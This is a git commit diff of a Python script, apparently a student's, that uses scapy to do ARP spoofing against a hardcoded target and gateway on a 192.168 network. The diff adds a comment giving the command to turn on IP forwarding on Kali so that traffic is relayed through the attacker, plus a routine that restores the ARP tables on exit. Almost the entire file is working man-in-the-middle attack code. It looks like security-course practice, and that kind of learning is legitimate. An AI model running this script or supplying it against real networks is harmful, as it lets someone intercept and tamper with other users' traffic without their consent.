bcd1d4303850db2523ca0f85c94ffb3ffb5a5074
Shanto2378 <hasibul.shanto1@northsouth.edu>
2024-03-13 02:37:28 +0600

    finished code with specific destination and target

--- arp_spoofer.py
+++ arp_spoofer.py
@@ -1,7 +1,12 @@
 #!/usr/bin/env python3
 
-import scapy.all as scapy
-import time
+# to start port forword on kali run this › echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+import scapy.all as scapy, time, argparse
+
+target_ip = "192.168.10.198"
+gateway_ip = "192.168.10.1"
+
 
 
 def get_mac(ip):
@@ -9,7 +14,6 @@ def get_mac(ip):
     broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff") # creating an Ether object
     arp_request_broadcast = broadcast/arp_request # combining the two objects
     answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0] # sending the request and storing the answered and unanswered requests
-
     return answered_list[0][1].hwsrc # returning the MAC address of the target
 
 
@@ -19,11 +23,25 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip) # pdst = IP of the target, hwdst = MAC of the target, psrc = IP of the router
     scapy.send(packet, verbose = False) # sending the packet
 
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip) # getting the MAC address of the target
+    source_mac = get_mac(source_ip) # getting the MAC address of the source
+    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst  =  destination_mac, psrc = source_ip, hwsrc = source_mac) # pdst = IP of the target, hwdst = MAC of the target, psrc = IP of the router
+    scapy.send(packet, verbose = False) # sending the packet
 
-sent_packets_count = 0
-while True:
-    spoof("192.168.10.198", "192.168.10.1")
-    spoof("192.168.10.1", "192.168.10.198")
-    sent_packets_count += 2
-    print("[+] Sent",sent_packets_count,"packets.")
-    time.sleep(2)
+try:
+    sent_packets_count = 0
+    while True:
+        spoof(target_ip, gateway_ip) # spoofing the target
+        spoof(gateway_ip, target_ip) # spoofing the router
+        sent_packets_count += 2 # incrementing the counter
+        print("\r [+] Sent " + str(sent_packets_count) + " packets.", end = "") # \r is used to print the output on the same line
+        time.sleep(2) # sleeping for 2 seconds
+
+except KeyboardInterrupt:
+    print("\n [+] Detected CTRL + C") # printing the message
+    restore(target_ip, gateway_ip) # restoring the ARP tables
+    restore(gateway_ip, target_ip) # restoring the ARP tables
+
+finally:
+    print(" [+] Resetting ARP tables ==> Please wait.")
